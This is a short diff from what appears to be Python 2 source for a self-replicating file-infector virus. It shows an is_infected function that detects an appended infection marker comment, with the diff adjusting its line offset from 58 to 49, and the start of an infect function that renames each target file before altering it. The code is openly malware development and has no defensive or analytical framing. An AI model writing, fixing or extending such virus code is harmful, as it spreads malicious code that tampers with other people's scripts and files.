@@ -4,8 +4,8 @@ def is_infected(filename):
    if len(lines) < 58:
       return False
    print len(lines)
-   print lines[len(lines) - 58]
-   return lines[len(lines) - 58].startswith('######################################################## First script python')
+   print lines[len(lines) - 49]
+   return lines[len(lines) - 49].startswith('######################################################## First script python')
 
 def infect(filename):
    os.rename(filename, filename + '-copy')
